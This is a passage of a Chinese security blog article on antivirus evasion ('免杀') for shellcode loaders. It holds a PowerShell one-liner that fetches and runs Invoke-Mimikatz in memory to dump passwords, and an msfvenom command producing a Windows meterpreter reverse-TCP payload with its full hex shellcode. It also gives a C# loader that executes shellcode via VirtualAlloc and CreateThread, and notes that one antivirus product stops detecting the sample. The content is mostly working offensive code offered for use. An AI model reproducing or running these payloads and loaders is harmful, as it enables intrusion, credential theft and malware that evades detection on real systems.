YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">看下查杀情况: 去除shellcode后火绒已经不杀了</p><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="82" data-backw="319" data-ratio="0.25882352941176473" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结一/5_ibCQ7dcojbn9ldWD00J7UQdaOL6ayw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAkiaysPDUFKEjFKeXoAz8qbUPn0icibCQ7dcojbn9ldWD00J7UQdaOL6ayw/640?wx_fmt=png'" data-type="png" data-w="1020" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">类似这种远程读取中还有很多 ，类如powershell内存加载，相信各位也没少用过</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">举例:powershell远程加载mimikatz读取密码</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"> powershell IEX (<span style="color: rgb(0, 134, 179);">New</span>-<span style="color: rgb(0, 134, 179);">Object</span> <span style="color: rgb(0, 134, 179);">Net</span>.<span style="color: rgb(0, 134, 179);">WebClient</span>).<span style="color: rgb(0, 134, 179);">DownloadString</span>(<span style="color: rgb(24, 54, 145);">'</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">[url]https:<span style="color: rgb(150, 152, 150);">//raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'[/url]); Invoke-Mimikatz &gt;&gt;c:\1.txt</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code></pre></section><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="99" data-backw="319" data-ratio="0.3087818696883853" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结一/6_QdKWoqibQeevO5nFzxPRIxyyHaKyMw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAkanvtZ2uwjBsxLC1xMqIlsRfmDQdKWoqibQeevO5nFzxPRIxyyHaKyMw/640?wx_fmt=png'" data-type="png" data-w="706" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">类似的还有很多，不过这种用得很多内存加载有些杀软还是拦的，怎么解决我们文后面再说。</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">其实到这里，用的最多的语言加载器的原理不用说也知道了，这里还是解释下加载器，引用我同事对加载器的解释:</p><p style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">shellcode就好比一杯水，加载器就是装水的杯子，水倒进了杯子才可以喝，shellcode被加载器装载后才可以执行。</p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;padding-left: 8px;font-weight: bold;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size:14px;line-height:34px;;border-left: 3px solid rgb(0, 152, 116);">A)那些加载器执行shellcode:</h3><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">ssi:</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">msfvenom -a x86 --platform <span style="color: rgb(0, 134, 179);">Windows</span> -p windows/meterpreter/reverse_tcp LHOST=<span style="color: rgb(0, 134, 179);">192.168</span>.<span style="color: rgb(0, 134, 179);">174.142</span> LPORT=<span style="color: rgb(0, 134, 179);">4444</span> -f c &gt; msf.txt</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">No</span> encoder <span style="color: rgb(167, 29, 93);">or</span> badchars specified, outputting raw payload</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">Payload</span> size: <span style="color: rgb(0, 134, 179);">341</span> bytes</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(0, 134, 179);">Final</span> size of c file: <span style="color: rgb(0, 134, 179);">1457</span> bytes</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">cat msf.txt|grep -v <span style="color: rgb(167, 29, 93);">unsigned</span>|sed <span style="color: rgb(24, 54, 145);">"s/\"\\\x//g"</span>|sed <span style="color: rgb(24, 54, 145);">"s/\\\x//g"</span>|sed <span style="color: rgb(24, 54, 145);">"s/\"//g"</span>|sed <span style="color: rgb(24, 54, 145);">':a;N;$!ba;s/\n//g'</span>|sed <span style="color: rgb(24, 54, 145);">"s/;//g"</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c77260789e8ffd0b89001000029c454506829806b00ffd56a0a68c0a8ae84680200115c89e6505050504050405068ea0fdfe0ffd5976a1056576899a57461ffd585c0740aff4e0875ece8670000006a006a0456576802d9c85fffd583f8007e368b366a406800100000566a006858a453e5ffd593536a005653576802d9c85fffd583f8007d285868004000006a0050680b2f0f30ffd55768756e4d61ffd55e5eff0c240f8570ffffffe99bffffff01c329c675c1c3bbf0b5a2566a0053ffd5</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code></pre></section><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="29" data-backw="319" data-ratio="0.08902877697841727" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结一/7_icx8ic8oUnZZL5LoEEHfWAxuNxAicQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAkS6cib822rFey7aOFsic85dRWUBV25icx8ic8oUnZZL5LoEEHfWAxuNxAicQ/640?wx_fmt=png'" data-type="png" data-w="1112" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="69" data-backw="319" data-ratio="0.2147093712930012" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结一/8_kq5nuQOXlUopkS2RqIgNGSZDKPucCA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAkYFQQB8WhYBZjIbZDd6Bsvkib4kq5nuQOXlUopkS2RqIgNGSZDKPucCA/640?wx_fmt=png'" data-type="png" data-w="1686" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">shellcode_launcher:</h4><figure style="margin: 1.5em 8px;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-backh="86" data-backw="319" data-ratio="0.2695852534562212" src="图片/HACK学习呀_2020-02-08_干货Shellcode免杀总结一/9_mGgA3MEZ8iabQIEz0jrCZxMsqAYbEA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9aRERicd8n2Qkte4cYIIibAkt2lib5WZibIrIUuSVHqx0Zt8XyAmGgA3MEZ8iabQIEz0jrCZxMsqAYbEA/640?wx_fmt=png'" data-type="png" data-w="868" style="margin: 0.1em auto 0.5em;line-height: 1.75;border-radius: 4px;display: block;width: 100%;height: auto;" title="null"  /></figure><p style="color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;, BlinkMacSystemFont, Roboto, &quot;Helvetica Neue&quot;, sans-serif;font-size:14px;line-height:34px;;text-align: start;white-space: normal;"><br  /></p><h4 style="margin: 2em 8px 0.5em;font-weight: bold;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(0, 152, 116);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;">c#加载:</h4><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang=""><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">using</span> <span style="color: rgb(0, 134, 179);">System</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">using</span> <span style="color: rgb(0, 134, 179);">System</span>.<span style="color: rgb(0, 134, 179);">Runtime</span>.<span style="color: rgb(0, 134, 179);">InteropServices</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><span style="color: rgb(167, 29, 93);">namespace</span> <span style="color: rgb(0, 134, 179);">TCPMeterpreterProcess</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">{</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    <span style="color: rgb(167, 29, 93);">class</span> <span style="color: rgb(0, 134, 179);">Program</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">    {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">void</span> <span style="color: rgb(0, 134, 179);">Main</span>(<span style="color: rgb(167, 29, 93);">string</span>[] args)</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">        {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(150, 152, 150);">// native function’s compiled code</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(150, 152, 150);">// generated with metasploit</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">byte</span>[] shellcode = <span style="color: rgb(167, 29, 93);">new</span> <span style="color: rgb(167, 29, 93);">byte</span>[<span style="color: rgb(0, 134, 179);">333</span>] {</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer"><br  /></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            };</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> funcAddr = <span style="color: rgb(0, 134, 179);">VirtualAlloc</span>(<span style="color: rgb(0, 134, 179);">0</span>, (<span style="color: rgb(0, 134, 179);">UInt32</span>)shellcode.<span style="color: rgb(0, 134, 179);">Length</span>,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">Marshal</span>.<span style="color: rgb(0, 134, 179);">Copy</span>(shellcode, <span style="color: rgb(0, 134, 179);">0</span>, (<span style="color: rgb(0, 134, 179);">IntPtr</span>)(funcAddr), shellcode.<span style="color: rgb(0, 134, 179);">Length</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">IntPtr</span> hThread = <span style="color: rgb(0, 134, 179);">IntPtr</span>.<span style="color: rgb(0, 134, 179);">Zero</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> threadId = <span style="color: rgb(0, 134, 179);">0</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(150, 152, 150);">// prepare data</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">IntPtr</span> pinfo = <span style="color: rgb(0, 134, 179);">IntPtr</span>.<span style="color: rgb(0, 134, 179);">Zero</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(150, 152, 150);">// execute native code</span></span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            hThread = <span style="color: rgb(0, 134, 179);">CreateThread</span>(<span style="color: rgb(0, 134, 179);">0</span>, <span style="color: rgb(0, 134, 179);">0</span>, funcAddr, pinfo, <span style="color: rgb(0, 134, 179);">0</span>, <span style="color: rgb(167, 29, 93);">ref</span> threadId);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">WaitForSingleObject</span>(hThread, <span style="color: rgb(0, 134, 179);">0xFFFFFFFF</span>);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            }</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(0, 134, 179);">UInt32</span> MEM_COMMIT = <span style="color: rgb(0, 134, 179);">0x1000</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(0, 134, 179);">UInt32</span> PAGE_EXECUTE_READWRITE = <span style="color: rgb(0, 134, 179);">0x40</span>;</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            [<span style="color: rgb(0, 134, 179);">DllImport</span>(<span style="color: rgb(24, 54, 145);">"kernel32"</span>)]</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">extern</span> <span style="color: rgb(0, 134, 179);">UInt32</span> <span style="color: rgb(0, 134, 179);">VirtualAlloc</span>(<span style="color: rgb(0, 134, 179);">UInt32</span> lpStartAddr,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> size, <span style="color: rgb(0, 134, 179);">UInt32</span> flAllocationType, <span style="color: rgb(0, 134, 179);">UInt32</span> flProtect);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            [<span style="color: rgb(0, 134, 179);">DllImport</span>(<span style="color: rgb(24, 54, 145);">"kernel32"</span>)]</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">extern</span> <span style="color: rgb(167, 29, 93);">bool</span> <span style="color: rgb(0, 134, 179);">VirtualFree</span>(<span style="color: rgb(0, 134, 179);">IntPtr</span> lpAddress,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> dwSize, <span style="color: rgb(0, 134, 179);">UInt32</span> dwFreeType);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            [<span style="color: rgb(0, 134, 179);">DllImport</span>(<span style="color: rgb(24, 54, 145);">"kernel32"</span>)]</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">extern</span> <span style="color: rgb(0, 134, 179);">IntPtr</span> <span style="color: rgb(0, 134, 179);">CreateThread</span>(</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> lpThreadAttributes,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> dwStackSize,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> lpStartAddress,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">IntPtr</span> param,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(0, 134, 179);">UInt32</span> dwCreationFlags,</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            <span style="color: rgb(167, 29, 93);">ref</span> <span style="color: rgb(0, 134, 179);">UInt32</span> lpThreadId</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            );</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            [<span style="color: rgb(0, 134, 179);">DllImport</span>(<span style="color: rgb(24, 54, 145);">"kernel32"</span>)]</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">                    <span style="color: rgb(167, 29, 93);">private</span> <span style="color: rgb(167, 29, 93);">static</span> <span style="color: rgb(167, 29, 93);">extern</span> <span style="color: rgb(167, 29, 93);">bool</span> <span style="color: rgb(0, 134, 179);">CloseHandle</span>(<span style="color: rgb(0, 134, 179);">IntPtr</span> handle);</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer">            [<span style="color: rgb(0, 134, 179);">DllImport</span>(<span style="color: rgb(24, 54, 145);">"kernel32"</span>)]</span></code><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;white-space: pre;display: flex;border-width: 0px !important;border-style: 